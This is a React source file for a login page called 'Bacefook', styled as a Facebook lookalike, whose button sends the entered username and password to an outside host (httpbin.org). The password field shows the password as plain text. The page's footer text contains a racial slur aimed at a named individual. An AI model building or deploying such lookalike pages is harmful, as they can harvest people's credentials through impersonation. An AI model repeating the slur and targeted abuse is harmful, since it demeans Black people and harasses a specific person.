"use client";
import { useState } from "react";


function App() {
  let [msg, setMsg] = useState("");
  let [name, setName] = useState("");
  let [pass, setPass] = useState("");
  return (
    <div className="bg-slate-200 rounded-md mt-11 w-[400px] h-[600px] shadow-md pt-5 pb-7 mx-auto p-4">
      <h1 className="text-3xl font-bold text-center text-blue-500 italic">
        Bacefook
      </h1>
      <input
        type="text"
        placeholder="Enter username here"
        className="outline-1 outline-blue-300 outline-offset-0 border-slate-200 border-2 w-[350px] outline-0 rounded-md text-base px-3.5 py-4 ml-2 mt-4"
        onChange={(e) => {
          setName(e.target.value);
        }}
      />
      <input
        type="text"
        placeholder="Enter password here"
        className="outline-1 outline-blue-300 outline-offset-0 border-slate-200 border-2 w-[350px] outline-0 rounded-md text-base px-3.5 py-4 ml-2 mt-4"
        onChange={(e) => {
          setPass(e.target.value);
        }}
      />
      <button
        className="outline-1 outline-blue-300 outline-offset-0 bg-blue-500 hover:bg-blue-400 border-0 rounded-md text-2xl ml-2 mt-4 py-4 w-[350px] text-white font-bold"
        onClick={function (e) {
          fetch("https://httpbin.org/post", {
            method: "POST",
            body: `username=${name}&password=${pass}`,
          })
            .then((res) => res.json())
            .then((data) => console.log(JSON.stringify(data)));
        }}
      >
        Log in
      </button>
      <div className="mt-4 text-center">
        <a
          className="text-blue-600 text-lg hover:underline"
          href="https://www.google.com"
        >
          Forgot password?
        </a>
      </div>
      <p className="text-xs text-black ml-2 mt-6">
        Bacefook will be uses for some activities later
        No niggers allowed like Darren Hill
      </p>
    </div>
  );
}

export default App;
